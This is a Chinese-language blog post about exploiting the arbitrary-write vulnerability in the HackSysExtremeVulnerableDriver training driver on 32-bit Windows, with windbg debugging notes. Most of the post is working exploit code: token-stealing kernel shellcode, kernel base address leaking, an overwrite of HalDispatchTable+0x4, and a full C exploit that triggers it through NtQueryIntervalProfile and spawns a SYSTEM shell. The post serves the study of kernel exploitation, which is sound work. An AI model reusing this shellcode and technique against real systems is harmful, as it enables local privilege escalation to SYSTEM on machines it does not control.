

+++

  author = "2st"
  title = "Windows Kernel Exploit 2-ArbitraryWrite"
  date = "2020-06-17T01:06:05+08:00"
  description = "NULL"
  tags = [
      "kernel","exploit"

]
categories = [
    "Windows","pwn"
]
aliases = ["migrate-from-jekyl"]
favorite = true

+++

友好简单的Windows内核漏洞分析2（因为考虑将此系列投稿到某平台，所以暂时将内容挂起，交流请私戳）

<!--more-->

### 0x1 前置知识

ArbitraryWrite：攻击者可控4byte的地址指针和4byte的内容指针，任意写，，，emmmmm，，，R0里这么搞会出大问题，这个漏洞点没什么说的，但是漏洞利用过程中遇到了一些有意思的利用链。

### 0x2 API？

1. 传输想要写的Addr以及Content

```c
#define Write_What_Where  0x22200B
DeviceIoControl(hDevice,Write_What_Where,&exploit,sizeof(WRITE_WHAT_WHERE),NULL,0,&lpbReturn,NULL);
```

2. shellcode，根据调试，需要pop三个参数保持堆栈平衡。

```C
static VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi	// the stack balancing
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		//int 3
		ret
	}
}
```

4. 

```c
//用`EnumDeviceDrivers`函数检索系统中每个设备驱动程序的加载地址，然后用`GetDeviceDriverBaseNameA`函数检索指定设备驱动程序的基本名称，以此确定 ntkrnlpa.exe 在内核模式中的基地址，当然我们需要包含文件头`Psapi.h`。如果是pwn选手的话，这个步骤可以理解为泄露libc的基地址。
LPVOID NtkrnlpaBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

		if (!strcmp(lpfileName, "ntkrnlpa.exe"))
		{
			printf("[+]success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}
```

```c
HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");
// 获取ntkrnlpa.exe在r3下的基地址
```

```c
PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
// 获取ntkrnlpa.exe的导出函数HalDispatchTable的地址
```

```c
DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;
//计算HalDispatchTable+0x4的地址，即真实低地址=内核基地址+r3算出来的偏移，pwn选手可以很容易理解，因为相对偏移是固定的
```

5. 当我们利用4里面的方法获取我们想覆盖的位置的时候，调用内核函数`NtQueryIntervalProfile`就可以实现提权，因为这个函数中call了我们之前覆盖的位置，到这里读者也应该明白我们第4步计算地址的目的了。

### 0x3 调试验证过程

我们需要下的断点

> HEVD!TriggerArbitraryWrite
>
> nt!NtQueryIntervalProfile

先看看内核函数是怎么调用我们需要覆盖的地址的

在windbg中查看NtQueryIntervalProfile+0x62位置的汇编

![](http://23.91.100.118:8080/images/2020/06/16/6bc8aba14503f84e907b15fb3fc2bbcc.png)

发现8415fed6的位置call了一个函数`KeQueryIntervalProfile`，跟进去看看

![](http://23.91.100.118:8080/images/2020/06/16/d4c9b71f256c3d776c8f549c98e480c8.png)

函数在8411e438的位置call了一个地址，这个地址就是我们想要覆盖的。（PS：这个就是前人发现的神奇调用，查阅资料说是这个call比较稳定，内核调用比较少，不容易蓝屏，CVE-2018-8120 也是利用了这个位置）

内核服务函数指针表`HalDispatchTable`的定义如下：

```c
HAL_DISPATCH HalDispatchTable = {
    HAL_DISPATCH_VERSION,
    xHalQuerySystemInformation,
    xHalSetSystemInformation,
    xHalQueryBusSlots,
    xHalDeviceControl,
    xHalExamineMBR,
    xHalIoAssignDriveLetters,
    xHalIoReadPartitionTable,
    xHalIoSetPartitionInformation,
    xHalIoWritePartitionTable,
    xHalHandlerForBus,                  // HalReferenceHandlerByBus
    xHalReferenceHandler,               // HalReferenceBusHandler
    xHalReferenceHandler                // HalDereferenceBusHandler
    };
```

我们需要做的很简单，把Where覆盖为HalDispatchTable+0x4，What覆盖为&shellcode，逆向的东西很简单，不说了。

接下来看提权流程：需要覆盖的Where和What是没问题的

![](http://23.91.100.118:8080/images/2020/06/16/ab396c6ba07d1c651cfa57ef2403eadc.png)

覆盖完成

![](http://23.91.100.118:8080/images/2020/06/16/3ddf0508723720f011ecf3f6c0149e0c.png)

然后我在`NtQueryIntervalProfile`下了个断点，因为网上流传的相关漏洞各种exp版本中都是`NtQueryIntervalProfile(0x1337, &interVal);`这么写的。我比较在意这个0x1337是怎么出来的，仔细看了一眼汇编应该是不为0就行，个人也验证了下参数为正整数的情况都可以正常提权。

![](http://23.91.100.118:8080/images/2020/06/16/c640c7e9bdde6125b9384c0446ec8199.png)



至此提权成功。

### 0x4 留图纪念

![](http://23.91.100.118:8080/images/2020/06/16/2287e1aa7d0943424d22bef96e3e4b3c.png)

### 0x5 快速食用指南

![](http://23.91.100.118:8080/images/2020/06/16/504b2686e5ead1252aa84fcc39fba181.png)

### 0x6 Exp

```c
#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
#include<profileapi.h>
#define Write_What_Where  0x22200B
/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                     Write-What-Where                                 */
/************************************************************************/

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

HANDLE hDevice = NULL;

static VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi	// the stack balancing
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		//int 3
		ret
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

LPVOID NtkrnlpaBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

		if (!strcmp(lpfileName, "ntkrnlpa.exe"))
		{
			printf("[+]success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD32 GetHalOffset_4()
{
	// ntkrnlpa.exe in kernel space base address
	PVOID pNtkrnlpaBase = NtkrnlpaBase();

	printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntkrnlpa.exe");//这里修改了一下原Exp
	printf("[-]hUserSpaceBase: 0x%p\n",hUserSpaceBase);
	// HalDispatchTable in user space address
	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
	printf("[-]pUserSpaceAddress: 0x%p\n", pUserSpaceAddress);
	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;

	printf("[+]HalDispatchTable+0x4 is 0x%p\n", hal_4);

	return (DWORD32)hal_4;
}

VOID Trigger_shellcode(DWORD32 where, DWORD32 what)
{

	WRITE_WHAT_WHERE exploit;
	DWORD lpbReturn = 0;

	exploit.Where = (PVOID)where;
	exploit.What = (PVOID)&what;
	printf("[+]Write at 0x%p\n", where);
	printf("[+]Write with 0x%p\n", what);

	printf("[+]Start to trigger...\n");

	DeviceIoControl(hDevice,
		Write_What_Where,
		&exploit,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("[+]Success to trigger...\n");
}


BOOL init()
{
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("[+]Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf("[+]Success to get HANDLE!\n");
	return TRUE;
}

int main()
{
	DWORD interVal = 0;

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return 0;
	}

	DWORD32 Hal_hook_address = GetHalOffset_4();

	printf("[+]HalDispatchTable+0x4 is 0x%p\n", Hal_hook_address);

	Trigger_shellcode((PULONG_PTR)Hal_hook_address, (PVOID)&ShellCode);

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);

	NtQueryIntervalProfile(0x1337, &interVal);

	printf("[+]Start to Create cmd...\n");
	CreateCmd();

	system("pause");
	return 0;
}
```

感谢 [Thunder_J](https://thunderjie.github.io/)提供的exp